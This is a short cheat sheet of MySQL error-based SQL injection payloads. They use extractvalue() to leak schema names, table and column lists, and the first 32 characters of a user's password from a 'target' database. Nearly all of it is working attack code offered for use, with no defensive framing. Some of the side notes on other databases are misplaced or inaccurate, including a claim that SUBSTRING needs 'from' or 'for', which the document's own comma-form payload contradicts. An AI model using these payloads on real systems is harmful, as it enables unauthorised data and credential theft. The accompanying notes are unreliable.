
# SQL Injection Commands Using `extractvalue()` for Data Exfiltration

These commands use MySQL's `extractvalue()` function to leak data through XML error messages. This technique is useful when other output methods are blocked during SQL injection attacks.

---

## 1. List All Database Schemas

```sql
extractvalue('', concat('>', (
  select group_concat(table_schema) 
  from (
    select table_schema 
    from information_schema.tables 
    group by table_schema
  ) as foo
)))
```

**Purpose**: Retrieve all database names on the server.

The group_concat() function is unique to MySQL. Current versions of Microsoft SQL Server and PostgreSQL have a very similar STRING_AGG() function. Additionally, current versions of Oracle DB have a LISTAGG() function that is similar to the STRING_AGG() functions.

---

## 2. List All Tables in the `target` Database

```sql
extractvalue('', concat('>', (
  select group_concat(table_name) 
  from (
    select table_name 
    from information_schema.tables 
    where table_schema='target'
  ) as foo
)))
```

**Purpose**: Enumerate all tables in the `target` database.

---

## 3. Paginated Table Names in `target` (Limit + Offset)

```sql
extractvalue('', concat('>', (
  select group_concat(table_name) 
  from (
    select table_name 
    from information_schema.tables 
    where table_schema='target' 
    limit 2 offset 32
  ) as foo
)))
```

**Purpose**: Retrieve 2 table names starting from the 33rd entry in the `target` database (pagination).

---

## 4. List Columns in the `target_users` Table

```sql
extractvalue('', concat('>', (
  select group_concat(column_name) 
  from (
    select column_name 
    from information_schema.columns 
    where table_schema='target' 
      and table_name='target_users'
  ) as foo
)))
```

**Purpose**: List column names in the `target_users` table.

Microsoft SQL Server has a nearly identical SUBSTRING() function and Oracle DB has a SUBSTR() function that takes the same parameters. PostgreSQL has two different functions for substrings. The MySQL SUBSTRING() function follows the same parameter format as the SUBSTR() function. The SUBSTRING() function must include a from or for keyword in the function call.

---

## 5. Extract First 32 Characters of First User Password

```sql
extractvalue('', concat('>', (
  select substring(password, 1, 32) 
  from target_users 
  limit 1 offset 0
)))
```

**Purpose**: Leak the first 32 characters of the password for the first user in the `target_users` table.

---
